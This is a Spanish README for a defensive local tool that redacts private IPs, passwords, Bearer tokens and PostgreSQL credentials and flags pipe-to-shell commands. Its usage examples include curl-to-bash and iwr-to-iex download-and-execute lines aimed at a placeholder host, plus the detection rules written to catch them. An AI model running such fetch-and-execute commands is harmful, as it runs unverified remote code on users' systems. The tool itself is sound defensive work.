# SENTINEL Clipboard Firewall

Herramienta local para detectar y sanitizar IPv4 privadas, asignaciones de
contraseña, tokens Bearer y credenciales en URLs PostgreSQL en texto
proporcionado explícitamente por stdin, y revisar comandos Bash o PowerShell
sin ejecutarlos.
Requiere Python 3.11 o superior y usa
solo la biblioteca estándar durante la ejecución.

## Uso

Instala el proyecto con `pip install .` y ejecuta:

```sh
printf 'host=10.20.30.40 peer=10.20.30.40' | sentinel sanitize
# host=[PRIVATE_IP_1] peer=[PRIVATE_IP_1]

printf 'host=10.20.30.40' | sentinel scan
# [{"rule_id": "RFC1918_IPV4", "category": "infrastructure", "start": 5, "end": 16, "severity": "informational", "explanation": "Dirección IPv4 en un rango privado RFC 1918."}]

printf 'password=Synthetic42 pwd=Synthetic42' | sentinel sanitize
# password=[PASSWORD_1] pwd=[PASSWORD_1]

printf 'Authorization: Bearer Synthetic42' | sentinel sanitize
# Authorization: Bearer [BEARER_TOKEN_1]

printf 'postgres://synthetic:example42@db.example:5432/app' | sentinel sanitize
# postgres://[POSTGRES_USER_1]:[POSTGRES_PASSWORD_1]@db.example:5432/app

printf '%s\n' 'curl https://example.invalid/synthetic.sh | bash' | sentinel check-command

printf '%s\n' 'iwr https://example.invalid/synthetic.ps1 | iex' | sentinel check-command --shell powershell
```

`scan` devuelve una lista JSON de hallazgos con posiciones de caracteres
`[inicio, fin)` y sin incluir los valores encontrados. `sanitize` conserva el
resto del texto y reutiliza una etiqueta para cada valor repetido de la misma categoría durante
la operación. Se admiten hasta 1 MiB de entrada UTF-8; errores y diagnósticos
van a stderr sin reproducir la entrada.

Se detectan IPv4 válidas de los rangos 10/8, 172.16/12 y 192.168/16,
excluyendo las incrustadas en IPv6.

Las asignaciones admiten las claves completas `password`, `passwd` y `pwd`
(sin distinguir mayúsculas), opcionalmente entre comillas, con `=` o `:` y
espacios o tabuladores alrededor del separador. Los valores pueden ir entre
comillas simples o dobles en una sola línea, o sin comillas hasta un espacio,
coma, punto y coma, comilla, llave o corchete. Se conservan la clave, las
comillas y el resto del texto; solo se reemplaza el valor por `[PASSWORD_n]`.
Los valores vacíos, referencias completas `${NAME}` o `$NAME` y etiquetas
generadas se omiten. La numeración es independiente por categoría y operación;
las repeticiones se comparan literalmente, sin interpretar escapes.
Si una contraseña contiene una IPv4 privada, se informa y sustituye el valor
completo de la contraseña, evitando intervalos superpuestos.

Se admiten encabezados literales `Authorization: Bearer <token>`, sin distinguir
mayúsculas, con espacios o tabuladores en una sola línea. El token puede usar
letras ASCII, dígitos, `-._~+/` y signos `=` al final. No se aceptan prefijos de
tokens con caracteres fuera de ese conjunto. Solo se sustituye el token por
`[BEARER_TOKEN_n]`, conservando encabezado, esquema y espacios. Los tokens
vacíos y las etiquetas existentes se omiten; las etiquetas Bearer y de
contraseña presentes en el texto se reservan antes de numerar valores nuevos.
Un token que también sea una IPv4 se sustituye como Bearer; un encabezado
dentro del valor de una contraseña se sustituye como parte de esa contraseña.
No se interpretan representaciones JSON de encabezados ni encabezados plegados.

En candidatas `postgres://` y `postgresql://` con userinfo se sustituyen el usuario
y la contraseña no vacíos por `[POSTGRES_USER_n]` y `[POSTGRES_PASSWORD_n]`.
Las etiquetas existentes se reservan por tipo y operación. Los valores con
percent-encoding se comparan literalmente, sin decodificarlos. Se oculta un
userinfo inequívoco incluso con puertos inválidos, hosts malformados o varios
hosts, conservando el resto de la candidata. No se valida la conectividad ni
la configuración del servidor. Si el userinfo es ambiguo (por ejemplo, varios
`@` en la autoridad o escapes inválidos), se sustituye la candidata completa
por `[POSTGRES_URL_n]`.
Dentro de estas candidatas con userinfo no se aplican las otras reglas, para
evitar sustituciones parciales. Si una asignación de contraseña contiene una
URL o termina dentro de ella, su intervalo se amplía para cubrir la URL entera.
Las URLs sin userinfo siguen permitiendo la detección IPv4. La regla cubre
solo userinfo en la autoridad: no analiza credenciales en la consulta, sockets
Unix ni todas las variantes de libpq; las candidatas terminan en espacios,
comillas o delimitadores angulares.

`check-command --shell bash|powershell` selecciona explícitamente el lenguaje;
el valor predeterminado es `bash`. `--shell` solo se admite con `check-command`.
La salida es una lista JSON con la regla detectada, severidad
`high`, explicación y sugerencia para descargar a un archivo, revisar su
contenido y verificar su origen e integridad antes de decidir ejecutarlo.
Nunca incluye el comando original. Usa la misma entrada UTF-8 y límite de
1 MiB que los otros comandos; errores de tokenización se comunican sin entrada
original y con código de salida 2. Un análisis completado devuelve código 0,
también cuando encuentra riesgos.

La regla Bash `CF-BASH-001` es heurística: reconoce `curl` o `wget` con una URL literal
HTTP(S), FTP(S) o SFTP, conectados por un pipe directo a `bash` o `sh`. Admite
espacios, saltos de línea tras el pipe y continuaciones con barra inversa.
Ignora comentarios Bash fuera de comillas. Distingue las opciones de salida
`curl -o/--output` y `wget -O/--output-document`, incluidas las formas con `=`:
solo considera el cuerpo en stdout (destino `-`, o salida predeterminada de
curl). Wget sin destino `-` guarda en archivo y no activa esta regla.
El intérprete debe leer stdin: se omiten archivos de script y el modo `-c`;
se admite `-s` con argumentos posicionales.
No es un parser completo de Bash: no resuelve variables, aliases, wrappers,
expansiones ni pipelines con pasos intermedios, y no determina cómo todas las
opciones o redirecciones afectan al flujo. Puede producir falsos positivos y
omitir riesgos. Un resultado vacío no garantiza que el comando sea seguro.
El análisis solo tokeniza texto; no ejecuta comandos ni accede a la red.

La regla PowerShell `CF-PS-001` detecta `Invoke-WebRequest` o `Invoke-RestMethod`
canalizados directamente a `Invoke-Expression`, incluidos los aliases `iwr`,
`irm` e `iex`, sin distinguir mayúsculas. Exige una URL literal HTTP(S),
posicional o mediante `-Uri`; las variables y cadenas interpoladas no se
expanden ni cuentan como URLs literales. Se omiten descargas con `-OutFile`,
incluida la forma `-OutFile:archivo`. Reconoce cadenas simples y dobles,
comentarios de línea y de bloque, y continuaciones con acento grave.
Las continuaciones con LF o CRLF también se reconocen pegadas al nombre o
a una URL sin comillas. Los saltos internos de comentarios de bloque no
separan comandos; el texto entre comillas conserva sus backticks y delimitadores
de comentario como datos.
Las menciones del patrón dentro de cadenas o comentarios no activan la regla.
La salida contiene solo metadatos y una recomendación estática de revisión.

Este soporte PowerShell también es heurístico: no interpreta el lenguaje
completo, resolución de nombres, aliases personalizados, parámetros abreviados,
here-strings, asignaciones, wrappers ni todas las combinaciones de parámetros
o redirecciones. Solo se analiza el lenguaje seleccionado; no hay detección
automática ni evaluación de expresiones. Un resultado vacío no garantiza
seguridad.

La detección es textual: no interpreta lenguajes de configuración, comentarios
ni valores multilínea, y solo cubre las claves y formas descritas.
No se hacen conexiones de red ni se ejecuta el texto de entrada. La ausencia
de hallazgos no garantiza que el texto sea seguro. El portapapeles y la GUI
están pendientes.

Los ejemplos y las pruebas usan exclusivamente datos sintéticos.
